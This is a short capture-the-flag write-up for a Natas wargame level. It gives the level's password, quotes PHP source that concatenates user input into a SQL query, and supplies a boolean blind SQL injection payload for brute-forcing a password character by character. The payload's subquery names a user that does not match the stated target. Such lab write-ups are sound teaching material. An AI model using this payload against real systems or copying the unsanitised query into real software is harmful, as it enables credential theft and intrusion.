
# Solution
```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

Based on the source code, we found out that the SQLi is in fact, conditional.

```php
<?php  
  
/*  
CREATE TABLE `users` (  
  `username` varchar(64) DEFAULT NULL,  
  `password` varchar(64) DEFAULT NULL  
);  
*/  
  
if(array_key_exists("username", $_REQUEST)) {    $link = mysqli_connect('localhost', 'natas15', '<censored>');    mysqli_select_db($link, 'natas15');    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";  
    if(array_key_exists("debug", $_GET)) {  
        echo "Executing query: $query<br>";  
    }    $res = mysqli_query($link, $query);  
    if($res) {  
    if(mysqli_num_rows($res) > 0) {  
        echo "This user exists.<br>";  
    } else {  
        echo "This user doesn't exist.<br>";  
    }  
    } else {  
        echo "Error in query.<br>";  
    }    mysqli_close($link);  
} else {  
?>
```

We also know `natas16` is one of the existing users, we can use this payload (Needs to be url-encoded), to bruteforce for password:
```
natas16" AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='natas')='a'-- -
```